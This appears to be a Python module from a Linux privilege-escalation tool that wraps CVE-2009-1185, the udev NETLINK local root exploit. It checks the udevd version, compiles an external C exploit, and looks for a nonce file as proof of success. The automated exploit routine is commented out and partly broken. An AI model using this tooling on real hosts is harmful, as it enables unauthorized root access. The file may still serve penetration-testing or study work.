"""
adapted from:
https://www.exploit-db.com/exploits/8572/
"""
import os
import uuid
import subprocess
from exploits.exploit import LinuxExploit
from src.kernels import KernelWindow
from constants import *


class CVE20091185(LinuxExploit):
	def __init__(self):
		LinuxExploit.__init__(self)
		self.name = "CVE20091185"
		self.formatted_name = "CVE-2009-1185"
		self.e_type = "linux"
		self.brief_desc = "udev before 1.4.1 NETLINK user space priv esc"
		self.reliability = MEDIUM_RELIABILITY
		self.vulnerable_base = KernelWindow(GENERIC_LINUX, BASE_VULNERABLE, 0, 0, 0, 2, 6, 27)
		self.vulnerable_kernels = [
			KernelWindow(GENERIC_LINUX, BASE_VULNERABLE, 0, 0, 0, 2, 6, 27),
		]
		self.exploit_kernels = [

		]
		self.source_c_path = os.path.join(LINUX_EXPLOIT_SOURCE_PATH, "{}.c".format(self.name))
		self.compilation_path = os.path.join(PLAYGROUND_PATH, self.name)
		self.compilation_command = "gcc -o {} {}".format(self.compilation_path, self.source_c_path)
		self.exploit_command = self.compilation_path

	def determine_vulnerability(self):
		"""
		For this vulnerability the following prerequisites have to be satisfied:
			- udevd version must be < 1.4.1

		:return: True if vulnerable, False if not
		"""
		color_print("\t[*] checking exploitation prerequisites for {}".format(self.name), color="blue")
		command_result = self.shell_results(["udevd", "--version"])
		udev_v = command_result[1].decode('utf-8').replace("\n", "").replace("--version: ", "")

		if "not found" in udev_v:
			self.exploit_failure("not vulnerable: ({})".format(udev_v))
			return False
		elif int(udev_v) < 141:
			color_print("\t[*] udev version: {}".format(udev_v))
			color_print("\t[+] system appears to be vulnerable to {}".format(self.name), color="green")
			return True

	def confirm_exploitation(self, nonce_to_confirm):
		"""
		confirm_exploitation

		Checks to see if the nonce was written to /tmp/nonce by the exploit
		:return: True or False
		"""
		command_result = self.shell_results(["cat", "/tmp/nonce"])
		call_result = command_result[0].decode('utf-8')

		if call_result == nonce_to_confirm:
			return True

		return False

	def parse_udevd_netlink_socket_from_grep(self, grep_results):
		for rline in grep_results:
			if "/udevd" in rline:
				return int(rline.split("\t")[1])
		return 0

	def exploit(self):
		self.exploit_failure("requires manual exploitation. check source")
		"""
		color_print("\t[*] attempting to exploit {}".format(self.name), bold=True)
		vuln = self.determine_vulnerability()
		if vuln:
			color_print("\t[*] compiling: \'{}\'".format(" ".join(self.compilation_command)))
			return_code = subprocess.call(self.compilation_command)
			if return_code == 0 and os.path.exists(self.compilation_path): # TODO: complete command setup (find proc numb...etc)
				color_print("\t[*] setting up /tmp/run for execution ...")
				root_nonce = uuid.uuid4().hex
				# write tmp_run to /tmp/run
				with open("/tmp/run", 'w') as run_file:
					run_file.write(tmp_run)

				color_print("\t[*] identifying udevd netlink socket PID ...")
				call_result = self.shell_results(["ps", "aux" "|" "grep" "udevd"])[0].decode('utf-8').split("\n")
				socket_pid = self.parse_udevd_netlink_socket_from_grep(call_result)
				if socket_pid == 0:
					self.exploit_failure("could not get udevd netlink socket PID")
				else:
					color_print("\t[*] running compiled exploit with necessary args")
					subprocess.call(self.exploit_command)
					if self.confirm_exploitation(root_nonce):
						color_print("\t[+] exploitation of CVE20091185 successful!", color="green", bold=True)
					else:
						self.exploit_failure("no exploitation output")
		else:
			self.exploit_failure("not vulnerable to CVE20091185")
			
		"""
